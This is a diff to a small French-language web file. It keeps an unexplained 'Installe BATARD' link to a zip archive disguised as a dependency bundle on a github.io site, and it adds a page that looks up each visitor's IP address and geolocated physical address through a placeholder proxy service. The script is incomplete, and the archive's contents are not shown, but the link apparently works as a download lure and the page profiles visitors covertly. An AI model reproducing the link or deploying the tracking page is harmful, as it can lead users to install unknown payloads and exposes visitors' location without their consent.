@@ -1,1 +1,66 @@
 <a href="https://pikayutmg.github.io/CAT_MILK.deps.zip"> Installe BATARD </a>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Informations</title>
+</head>
+<body>
+    <h1>Informations de l'utilisateur</h1>
+    
+    <p><strong>Adresse IP:</strong> <span id="ipAddress"></span></p>
+    <p><strong>Adresse:</strong> <span id="address"></span></p>
+    <p><strong>Système d'exploitation:</strong> <span id="operatingSystem"></span></p>
+    <p><strong>Marque:</strong> <span id="brand"></span></p>
+    <p><strong>Fabricant:</strong> <span id="manufacturer"></span></p>
+    <p><strong>Encodage:</strong> <span id="encoding"></span></p>
+    <p><strong>User Agent :</strong> <span id="browserType"></span></p>
+    <p><strong>Version :</strong> <span id="mobileManufacturer"></span></p>
+
+    <script>
+        // Fonction pour récupérer l'adresse IP de l'utilisateur
+        function getIPAddress(callback) {
+            // Effectue une requête à un service proxy qui retourne l'adresse IP
+            var proxyURL = 'https://votre-service-proxy.com/ip';
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', proxyURL, true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.ip);
+                }
+            };
+            xhr.send();
+        }
+
+        // Fonction pour obtenir l'adresse à partir de l'adresse IP
+        function getAddress(ip, callback) {
+            // Effectue une requête à un service proxy qui retourne l'adresse à partir de l'adresse IP
+            var proxyURL = 'https://votre-service-proxy.com/address?ip=' + ip;
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', proxyURL, true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.address);
+                }
+            };
+            xhr.send();
+        }
+
+        // Obtient l'adresse de l'utilisateur
+        getIPAddress(function(ip) {
+            document.getElementById('ipAddress').textContent = ip;
+
+            getAddress(ip, function(address) {
+                document.getElementById('address').textContent = address;
+            });
+        });
+
+        // Le reste du code reste inchangé
+        // ...
+
+    </script>
+</body>
+</html>
